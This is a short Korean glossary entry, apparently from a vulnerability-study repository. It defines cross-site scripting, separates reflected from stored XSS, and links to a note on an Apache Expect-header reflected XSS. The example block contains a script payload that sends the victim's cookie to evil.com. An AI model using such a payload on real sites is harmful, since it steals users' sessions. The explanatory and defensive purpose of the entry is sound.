# XSS (Cross-Site Scripting, 크로스사이트 스크립팅)

**정의**: 공격자가 웹 페이지에 자신의 스크립트를 주입해서, 그 페이지를 보는 다른 사용자의 브라우저에서 그 스크립트가 실행되게 만드는 취약점이다. 응답에 즉시 반사되면 Reflected XSS, 서버에 저장돼 여러 사용자에게 노출되면 Stored XSS라고 부른다.

**왜 문제가 되는가**: 브라우저는 페이지에 포함된 스크립트를 "그 사이트가 실행시킨 것"으로 신뢰한다. 공격자의 스크립트가 실행되면 그 사이트에서의 쿠키/세션을 탈취하거나, 사용자 대신 임의 동작을 수행할 수 있다.

**간단한 예시**:
```
요청: GET /error?message=<script>document.location='https://evil.com/?c='+document.cookie</script>
응답 페이지가 message 값을 이스케이프 없이 그대로 출력하면,
페이지를 보는 사용자의 브라우저에서 저 스크립트가 그대로 실행됨.
```

**이 저장소의 예**: [CVE-2006-3918](../vulnerability/opensource/CVE-2006-3918-apache-expect-header-reflected-xss.md) (Apache Expect 헤더 반사)
